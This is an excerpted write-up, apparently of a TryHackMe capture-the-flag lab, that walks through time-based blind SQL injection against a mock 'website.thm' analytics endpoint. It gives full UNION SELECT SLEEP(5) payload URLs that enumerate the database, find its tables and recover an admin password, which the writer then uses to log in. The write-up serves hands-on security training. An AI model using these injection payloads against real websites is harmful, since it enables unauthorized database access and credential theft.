...
A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS, which is an acronym for  Database Management System. DBMSs fall into two camps: Relational and Non-Relational.
...
You're presented with a mock browser with the following URL:
...
Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is to discover the database name. We can do this by using 
the built-in **database()** method and then using the **like** operator to try and find results that will return a true status.
...
![](2026-01-07_13-42.png)

Then to find the tables, we do: `https://website.thm/analytics?referrer= referrer=admin123' UNION SELECT SLEEP(5),2 FROM  information_schema.tables where table_schema = 'sqli_four' and table_name like 'a%';--`

The tables i found are `analytics_referrers` and `users`:

`https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM  information_schema.tables where table_schema = 'sqli_four' and table_name like 'analytics_referrers';--`
...
And then try to find the column names:
...
We can assume that the username we are looking for is `admin`. Now we will be looking for the password: `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM  users where username = 'admin' and password like '%';--`

And we find that the password is `4961`: `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM  users where username = 'admin' and password like '4961';--`

Logging in with `admin:4961` yields the flag.
